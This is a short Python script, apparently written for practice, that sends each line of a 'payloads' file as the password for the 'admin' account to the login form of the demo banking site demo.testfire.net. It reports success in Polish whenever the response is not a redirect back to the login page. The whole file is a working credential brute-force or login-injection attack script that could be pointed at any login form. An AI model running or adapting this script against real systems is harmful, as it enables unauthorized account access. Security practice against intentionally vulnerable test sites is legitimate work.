import requests

url = 'https://demo.testfire.net/doLogin'

s = requests.session()
with open("payloads", "r", encoding="utf-8") as file:
    for line in file:
        line = line.strip()
        data = {'uid': 'admin', 'passw': line}
        response = s.post(url, data=data)
        if response.url == "https://demo.testfire.net/login.jsp":
            print("nie udalo sie")
        else:
            print("udalo sie!!")
file.close()


